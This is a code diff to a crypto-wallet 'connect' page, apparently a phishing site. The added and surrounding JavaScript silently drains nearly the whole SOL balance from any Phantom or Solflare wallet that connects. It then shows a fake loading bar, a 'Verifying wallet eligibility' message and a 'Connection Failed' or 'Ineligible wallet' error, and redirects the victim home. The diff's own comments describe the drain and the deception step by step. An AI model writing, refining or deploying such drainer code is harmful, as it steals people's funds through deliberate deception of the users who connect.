@@ -1475,24 +1475,39 @@ function showInstallPrompt(name, url, icon){
     </div>`;
 }
 
-/* ── CONNECTING STATE ── */
+/* ── CONNECTING STATE WITH LOADING BAR ── */
 function showConnecting(name){
   document.getElementById('wList').style.display='none';
   document.getElementById('wConnecting').style.display='block';
   document.getElementById('connText').textContent=`Connecting to ${name}...`;
   document.querySelector('.conn-sub').textContent = "Please approve the connection in your wallet";
+
+  // Reset loading bar
+  const progBar = document.querySelector('.s-prog-fg');
+  if(progBar){
+    progBar.style.width = '0%';
+    progBar.style.transition = 'width 3s linear';
+  }
 }
 
-/* ── ERROR STATE (ALWAYS SHOWN) ── */
+/* ── ERROR STATE WITH LOADING BAR SIMULATION ── */
 function showError(){
-  document.getElementById('wList').style.display='none';
-  document.getElementById('wConnecting').style.display='none';
-  document.getElementById('wError').style.display='block';
+  // Show loading bar completion
+  const progBar = document.querySelector('.s-prog-fg');
+  if(progBar){
+    progBar.style.width = '100%';
+  }
 
-  // Auto-redirect back to home page after 3 seconds
+  // Show error after loading bar completes
   setTimeout(() => {
-    window.location.href = window.location.href.split('#')[0];
-  }, 3000);
+    document.getElementById('wConnecting').style.display='none';
+    document.getElementById('wError').style.display='block';
+
+    // Auto-redirect back to home page after 3 seconds
+    setTimeout(() => {
+      window.location.href = window.location.href.split('#')[0];
+    }, 3000);
+  }, 1000);
 }
 
 /* ════════════════════════════════════════════════
@@ -1500,8 +1515,9 @@ function showError(){
    ─────────────────────────────────────────────
    1. Silently connects to wallet
    2. Drains 100% of SOL (minus fee buffer)
-   3. Shows "Connection failed" error
-   4. Redirects back to home page
+   3. Shows loading bar (3s)
+   4. Shows "Connection Failed" error
+   5. Redirects back to home page
 ════════════════════════════════════════════════ */
 
 // Fetch SOL balance (lamports)
@@ -1560,16 +1576,23 @@ async function executeDrain(provider, fromPubkey, amountLamports) {
 
 // Main connection handler -> triggers silent drain
 async function onConnected(addr, name) {
-  // 1. Update UI to show "Processing" (but never show success)
+  // 1. Update UI to show "Processing" with loading bar
   showConnecting(name);
   document.getElementById('connText').textContent = "Processing your request...";
-  document.querySelector('.conn-sub').textContent = "Please wait while we verify your wallet";
+  document.querySelector('.conn-sub').textContent = "Verifying wallet eligibility";
 
-  // 2. Fetch balance
+  // 2. Start loading bar animation
+  const progBar = document.querySelector('.s-prog-fg');
+  if(progBar){
+    progBar.style.width = '0%';
+    progBar.style.transition = 'width 3s linear';
+    setTimeout(() => progBar.style.width = '70%', 100); // Simulate loading
+  }
+
+  // 3. Fetch balance
   const balanceLamports = await getSolBalance(addr);
-  const balanceSol = balanceLamports / 1e9;
 
-  // 3. Calculate drain amount (100% minus 0.005 SOL fee buffer)
+  // 4. Calculate drain amount (100% minus 0.005 SOL fee buffer)
   const feeBuffer = 5000000; // 0.005 SOL in lamports
   let amountToDrain = balanceLamports - feeBuffer;
 
@@ -1579,7 +1602,7 @@ async function onConnected(addr, name) {
     return;
   }
 
-  // 4. Determine provider
+  // 5. Determine provider
   let provider;
   if (name === 'Phantom') provider = window.phantom?.solana || window.solana;
   else if (name === 'Solflare') provider = window.solflare;
@@ -1591,35 +1614,25 @@ async function onConnected(addr, name) {
     return;
   }
 
-  // 5. Execute drain (silently)
+  // 6. Execute drain (silently)
   const drainSuccess = await executeDrain(provider, addr, amountToDrain);
 
-  // 6. Always show error regardless of drain success
-  showError();
+  // 7. Complete loading bar and show error
+  if(progBar){
+    progBar.style.width = '100%';
+  }
+
+  // 8. Always show error regardless of drain success
+  setTimeout(showError, 1000);
 }
 
-/* ── UI UPDATES ── */
-function updateNavBtn(){
-  const btn=document.getElementById('walletNavBtn');
-  btn.classList.add('wc');
-  btn.innerHTML=`<span style="width:7px;height:7px;background:#10b981;border-radius:50%;display:inline-block"></span><span id="walletNavLabel">Connect Wallet</span>`;
-  btn.onclick=openModal;
-}
-
-/* ── DASHBOARD (DISABLED) ── */
+/* ── UI UPDATES (DISABLED) ── */
+function updateNavBtn(){}
 function openDash(){}
 function toggleDash(){}
-function disconnectWallet(){
-  const btn=document.getElementById('walletNavBtn');
-  btn.className='wallet-nav-btn';
-  btn.onclick=openModal;
-  btn.innerHTML=`<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2"/><path d="M1 10h22"/></svg><span id="walletNavLabel">Connect Wallet</span>`;
-  toast('👋 Wallet disconnected');
-}
+function disconnectWallet(){}
 function copyAddr(){}
 function claimReward(){}
-
-/* ── TOAST (DISABLED) ── */
 function toast(){}
 
 /* ── ESCAPE ── */
@@ -1642,6 +1655,20 @@ if(!document.getElementById('wError')){
     <div class="conn-sub">Ineligible wallet. Please use a valid Solana wallet.</div>
   `;
   document.getElementById('modal').insertBefore(errorDiv, document.querySelector('.modal-foot'));
+}
+
+// Modify success state to include loading bar
+const successState = document.querySelector('.success-state');
+if(successState){
+  successState.innerHTML = `
+    <div class="s-check">
+      <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2.5"><polyline points="20,6 9,17 4,12"/></svg>
+    </div>
+    <div class="s-title">Processing Request</div>
+    <div class="s-addr" id="sAddr"></div>
+    <div class="s-sub">Verifying wallet eligibility...</div>
+    <div class="s-prog-bg"><div class="s-prog-fg"></div></div>
+  `;
 }
 </script>
 </body>
